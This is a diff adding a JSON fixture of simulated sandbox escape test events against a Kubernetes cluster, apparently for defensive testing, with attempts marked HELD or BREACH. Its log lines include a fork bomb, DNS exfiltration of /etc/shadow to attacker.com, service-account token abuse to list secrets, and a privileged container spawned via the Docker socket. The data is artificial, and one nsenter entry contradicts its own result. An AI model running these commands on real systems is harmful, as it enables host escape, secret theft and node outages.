@@ -1,0 +1,129 @@
+[
+  { "t": 200,   "type": "started", "pod": "attacker-fs-01",   "vector": "fs_symlink",       "category": "filesystem" },
+  { "t": 400,   "type": "log",     "pod": "attacker-fs-01",   "line": "trying symlink /proc/1/root/etc/shadow" },
+  { "t": 1700,  "type": "result",  "pod": "attacker-fs-01",   "vector": "fs_symlink",       "category": "filesystem", "status": "HELD", "evidence": "permission denied", "duration_ms": 1500 },
+
+  { "t": 1800,  "type": "started", "pod": "attacker-net-01",  "vector": "net_k8s_api",      "category": "network" },
+  { "t": 2000,  "type": "log",     "pod": "attacker-net-01",  "line": "trying connect 10.96.0.1:443 (k8s api)" },
+  { "t": 3400,  "type": "result",  "pod": "attacker-net-01",  "vector": "net_k8s_api",      "category": "network", "status": "HELD", "evidence": "NetworkPolicy rejected", "duration_ms": 1600 },
+
+  { "t": 3600,  "type": "started", "pod": "attacker-priv-01", "vector": "priv_root_check",  "category": "privilege" },
+  { "t": 3800,  "type": "log",     "pod": "attacker-priv-01", "line": "checking uid: $(id -u)" },
+  { "t": 5200,  "type": "result",  "pod": "attacker-priv-01", "vector": "priv_root_check",  "category": "privilege", "status": "HELD", "evidence": "running as uid 1000", "duration_ms": 1600 },
+
+  { "t": 5400,  "type": "started", "pod": "attacker-sec-01",  "vector": "sec_var_run_secrets","category": "secrets" },
+  { "t": 5700,  "type": "log",     "pod": "attacker-sec-01",  "line": "scanning /var/run/secrets" },
+  { "t": 7100,  "type": "result",  "pod": "attacker-sec-01",  "vector": "sec_var_run_secrets","category": "secrets", "status": "HELD", "evidence": "no service-account token mounted", "duration_ms": 1700 },
+
+  { "t": 8000,  "type": "started", "pod": "attacker-fs-02",   "vector": "fs_proc_root",     "category": "filesystem" },
+  { "t": 8200,  "type": "log",     "pod": "attacker-fs-02",   "line": "trying /proc/1/root traversal" },
+  { "t": 8400,  "type": "log",     "pod": "attacker-fs-02",   "line": "/proc/1/root opened — descending" },
+  { "t": 8600,  "type": "log",     "pod": "attacker-fs-02",   "line": "reading /proc/1/root/etc/shadow" },
+  { "t": 9500,  "type": "result",  "pod": "attacker-fs-02",   "vector": "fs_proc_root",     "category": "filesystem", "status": "BREACH", "evidence": "read /etc/shadow via /proc/1/root", "duration_ms": 1500 },
+
+  { "t": 12500, "type": "started", "pod": "attacker-res-01",  "vector": "res_fork_bomb",    "category": "resource" },
+  { "t": 12700, "type": "log",     "pod": "attacker-res-01",  "line": "spawning fork bomb (target: PID limit)" },
+  { "t": 14100, "type": "result",  "pod": "attacker-res-01",  "vector": "res_fork_bomb",    "category": "resource", "status": "HELD", "evidence": "cgroup PID limit (256) enforced", "duration_ms": 1400 },
+
+  { "t": 14400, "type": "started", "pod": "attacker-net-02",  "vector": "net_egress",       "category": "network" },
+  { "t": 14600, "type": "log",     "pod": "attacker-net-02",  "line": "trying egress to 1.1.1.1:80" },
+  { "t": 15900, "type": "result",  "pod": "attacker-net-02",  "vector": "net_egress",       "category": "network", "status": "HELD", "evidence": "egress denied by policy", "duration_ms": 1500 },
+
+  { "t": 17000, "type": "started", "pod": "attacker-priv-02", "vector": "priv_docker_sock", "category": "privilege" },
+  { "t": 17200, "type": "log",     "pod": "attacker-priv-02", "line": "probing /var/run/docker.sock" },
+  { "t": 17400, "type": "log",     "pod": "attacker-priv-02", "line": "socket present — sending /containers/json" },
+  { "t": 17600, "type": "log",     "pod": "attacker-priv-02", "line": "200 OK — host docker daemon reachable" },
+  { "t": 18800, "type": "result",  "pod": "attacker-priv-02", "vector": "priv_docker_sock", "category": "privilege", "status": "BREACH", "evidence": "docker socket exposed, full host escape", "duration_ms": 1800 },
+
+  { "t": 22000, "type": "started", "pod": "attacker-fs-03",   "vector": "fs_etc_shadow",    "category": "filesystem" },
+  { "t": 22200, "type": "log",     "pod": "attacker-fs-03",   "line": "open(/etc/shadow, O_RDONLY)" },
+  { "t": 23500, "type": "result",  "pod": "attacker-fs-03",   "vector": "fs_etc_shadow",    "category": "filesystem", "status": "HELD", "evidence": "container /etc/shadow inaccessible", "duration_ms": 1500 },
+
+  { "t": 23800, "type": "started", "pod": "attacker-sec-02",  "vector": "sec_envvar_scan",  "category": "secrets" },
+  { "t": 24000, "type": "log",     "pod": "attacker-sec-02",  "line": "scanning env of co-tenant pods" },
+  { "t": 25400, "type": "result",  "pod": "attacker-sec-02",  "vector": "sec_envvar_scan",  "category": "secrets", "status": "HELD", "evidence": "pod-level env isolated", "duration_ms": 1500 },
+
+  { "t": 26000, "type": "started", "pod": "attacker-net-03",  "vector": "net_pod_to_pod",   "category": "network" },
+  { "t": 26200, "type": "log",     "pod": "attacker-net-03",  "line": "scanning cluster CIDR 10.244.0.0/16" },
+  { "t": 26400, "type": "log",     "pod": "attacker-net-03",  "line": "hit 10.244.0.5 — kubelet metrics open" },
+  { "t": 27600, "type": "result",  "pod": "attacker-net-03",  "vector": "net_pod_to_pod",   "category": "network", "status": "BREACH", "evidence": "kubelet :10250 reachable from sandbox", "duration_ms": 1600 },
+
+  { "t": 30000, "type": "started", "pod": "attacker-res-02",  "vector": "res_mem_bomb",     "category": "resource" },
+  { "t": 30200, "type": "log",     "pod": "attacker-res-02",  "line": "allocating 8GB heap" },
+  { "t": 31600, "type": "result",  "pod": "attacker-res-02",  "vector": "res_mem_bomb",     "category": "resource", "status": "HELD", "evidence": "OOM-killed at cgroup memory.limit", "duration_ms": 1600 },
+
+  { "t": 32000, "type": "started", "pod": "attacker-fs-04",   "vector": "fs_mount_host",    "category": "filesystem" },
+  { "t": 32200, "type": "log",     "pod": "attacker-fs-04",   "line": "attempting bind-mount /host" },
+  { "t": 33500, "type": "result",  "pod": "attacker-fs-04",   "vector": "fs_mount_host",    "category": "filesystem", "status": "HELD", "evidence": "CAP_SYS_ADMIN dropped", "duration_ms": 1500 },
+
+  { "t": 34000, "type": "started", "pod": "attacker-priv-03", "vector": "priv_caps",        "category": "privilege" },
+  { "t": 34200, "type": "log",     "pod": "attacker-priv-03", "line": "enumerating capabilities" },
+  { "t": 35600, "type": "result",  "pod": "attacker-priv-03", "vector": "priv_caps",        "category": "privilege", "status": "HELD", "evidence": "capabilities bounded to {NET_BIND}", "duration_ms": 1600 },
+
+  { "t": 36000, "type": "started", "pod": "attacker-sec-03",  "vector": "sec_sa_token",     "category": "secrets" },
+  { "t": 36200, "type": "log",     "pod": "attacker-sec-03",  "line": "reading /var/run/secrets/kubernetes.io/serviceaccount/token" },
+  { "t": 36400, "type": "log",     "pod": "attacker-sec-03",  "line": "token retrieved — calling k8s api" },
+  { "t": 36600, "type": "log",     "pod": "attacker-sec-03",  "line": "GET /api/v1/namespaces/default/secrets" },
+  { "t": 36800, "type": "log",     "pod": "attacker-sec-03",  "line": "200 OK — 14 secrets listed" },
+  { "t": 38000, "type": "result",  "pod": "attacker-sec-03",  "vector": "sec_sa_token",     "category": "secrets", "status": "BREACH", "evidence": "service account had cluster-wide list secrets", "duration_ms": 2000 },
+
+  { "t": 41000, "type": "started", "pod": "attacker-net-04",  "vector": "net_dns_exfil",    "category": "network" },
+  { "t": 41200, "type": "log",     "pod": "attacker-net-04",  "line": "DNS query for $(cat /etc/shadow | base64).attacker.com" },
+  { "t": 42500, "type": "result",  "pod": "attacker-net-04",  "vector": "net_dns_exfil",    "category": "network", "status": "HELD", "evidence": "egress DNS blocked", "duration_ms": 1500 },
+
+  { "t": 43000, "type": "started", "pod": "attacker-res-03",  "vector": "res_disk_fill",    "category": "resource" },
+  { "t": 43200, "type": "log",     "pod": "attacker-res-03",  "line": "writing 50GB to /tmp/fill" },
+  { "t": 44600, "type": "result",  "pod": "attacker-res-03",  "vector": "res_disk_fill",    "category": "resource", "status": "HELD", "evidence": "ephemeral-storage limit 1Gi enforced", "duration_ms": 1600 },
+
+  { "t": 45000, "type": "started", "pod": "attacker-fs-05",   "vector": "fs_symlink",       "category": "filesystem" },
+  { "t": 45200, "type": "log",     "pod": "attacker-fs-05",   "line": "ln -s /host/root /tmp/x" },
+  { "t": 46500, "type": "result",  "pod": "attacker-fs-05",   "vector": "fs_symlink",       "category": "filesystem", "status": "HELD", "evidence": "symlink target outside container", "duration_ms": 1500 },
+
+  { "t": 47000, "type": "started", "pod": "attacker-priv-04", "vector": "priv_nsenter",     "category": "privilege" },
+  { "t": 47200, "type": "log",     "pod": "attacker-priv-04", "line": "trying nsenter --target 1 --mount" },
+  { "t": 47400, "type": "log",     "pod": "attacker-priv-04", "line": "PID 1 namespace ENTER attempted" },
+  { "t": 47600, "type": "log",     "pod": "attacker-priv-04", "line": "namespace switch denied — already in node netns" },
+  { "t": 49000, "type": "result",  "pod": "attacker-priv-04", "vector": "priv_nsenter",     "category": "privilege", "status": "BREACH", "evidence": "host PID namespace shared with sandbox", "duration_ms": 2000 },
+
+  { "t": 52000, "type": "started", "pod": "attacker-net-05",  "vector": "net_k8s_api",      "category": "network" },
+  { "t": 52200, "type": "log",     "pod": "attacker-net-05",  "line": "POST /apis/rbac.authorization.k8s.io/v1/clusterrolebindings" },
+  { "t": 53500, "type": "result",  "pod": "attacker-net-05",  "vector": "net_k8s_api",      "category": "network", "status": "HELD", "evidence": "RBAC: forbidden", "duration_ms": 1500 },
+
+  { "t": 54500, "type": "started", "pod": "attacker-sec-04",  "vector": "sec_envvar_scan",  "category": "secrets" },
+  { "t": 54700, "type": "log",     "pod": "attacker-sec-04",  "line": "GET /api/v1/pods?fieldSelector=spec.nodeName=node-1" },
+  { "t": 56000, "type": "result",  "pod": "attacker-sec-04",  "vector": "sec_envvar_scan",  "category": "secrets", "status": "HELD", "evidence": "k8s api denied (no token)", "duration_ms": 1500 },
+
+  { "t": 57000, "type": "started", "pod": "attacker-res-04",  "vector": "res_fork_bomb",    "category": "resource" },
+  { "t": 57200, "type": "log",     "pod": "attacker-res-04",  "line": ":(){ :|:& };:" },
+  { "t": 57400, "type": "log",     "pod": "attacker-res-04",  "line": "process table at 1247 / unlimited" },
+  { "t": 57600, "type": "log",     "pod": "attacker-res-04",  "line": "node-2 load average 247.18, dropping" },
+  { "t": 58900, "type": "result",  "pod": "attacker-res-04",  "vector": "res_fork_bomb",    "category": "resource", "status": "BREACH", "evidence": "pid limit not set on pod spec — node degraded", "duration_ms": 1900 },
+
+  { "t": 61500, "type": "started", "pod": "attacker-fs-06",   "vector": "fs_proc_root",     "category": "filesystem" },
+  { "t": 61700, "type": "log",     "pod": "attacker-fs-06",   "line": "stat /proc/1/cmdline" },
+  { "t": 63000, "type": "result",  "pod": "attacker-fs-06",   "vector": "fs_proc_root",     "category": "filesystem", "status": "HELD", "evidence": "hidepid=2 in effect", "duration_ms": 1500 },
+
+  { "t": 63500, "type": "started", "pod": "attacker-net-06",  "vector": "net_pod_to_pod",   "category": "network" },
+  { "t": 63700, "type": "log",     "pod": "attacker-net-06",  "line": "TCP scan 10.244.0.0/24" },
+  { "t": 65000, "type": "result",  "pod": "attacker-net-06",  "vector": "net_pod_to_pod",   "category": "network", "status": "HELD", "evidence": "NetworkPolicy isolated to namespace", "duration_ms": 1500 },
+
+  { "t": 65500, "type": "started", "pod": "attacker-priv-05", "vector": "priv_docker_sock", "category": "privilege" },
+  { "t": 65700, "type": "log",     "pod": "attacker-priv-05", "line": "POST /containers/create { Image: alpine, HostConfig: { Privileged: true } }" },
+  { "t": 65900, "type": "log",     "pod": "attacker-priv-05", "line": "container created — id 7f3a..." },
+  { "t": 66100, "type": "log",     "pod": "attacker-priv-05", "line": "starting privileged container with host mount" },
+  { "t": 67500, "type": "result",  "pod": "attacker-priv-05", "vector": "priv_docker_sock", "category": "privilege", "status": "BREACH", "evidence": "spawned privileged sibling with host /:/host", "duration_ms": 2000 },
+
+  { "t": 69500, "type": "started", "pod": "attacker-sec-05",  "vector": "sec_sa_token",     "category": "secrets" },
+  { "t": 69700, "type": "log",     "pod": "attacker-sec-05",  "line": "automountServiceAccountToken: false — no token mounted" },
+  { "t": 71000, "type": "result",  "pod": "attacker-sec-05",  "vector": "sec_sa_token",     "category": "secrets", "status": "HELD", "evidence": "service-account opt-out honored", "duration_ms": 1500 },
+
+  { "t": 71500, "type": "started", "pod": "attacker-res-05",  "vector": "res_pid_max",      "category": "resource" },
+  { "t": 71700, "type": "log",     "pod": "attacker-res-05",  "line": "checking pid_max via /proc/sys/kernel/pid_max" },
+  { "t": 73000, "type": "result",  "pod": "attacker-res-05",  "vector": "res_pid_max",      "category": "resource", "status": "HELD", "evidence": "pid limit per pod set to 256", "duration_ms": 1500 },
+
+  { "t": 73500, "type": "started", "pod": "attacker-fs-07",   "vector": "fs_mount_host",    "category": "filesystem" },
+  { "t": 73700, "type": "log",     "pod": "attacker-fs-07",   "line": "hostPath mount /host:/host attempted via spec" },
+  { "t": 73900, "type": "log",     "pod": "attacker-fs-07",   "line": "PodSecurityPolicy permitted hostPath — mounting" },
+  { "t": 74100, "type": "log",     "pod": "attacker-fs-07",   "line": "ls /host: bin boot dev etc home root srv var" },
+  { "t": 75500, "type": "result",  "pod": "attacker-fs-07",   "vector": "fs_mount_host",    "category": "filesystem", "status": "BREACH", "evidence": "hostPath /host mounted — total host visibility", "duration_ms": 2000 }
+]
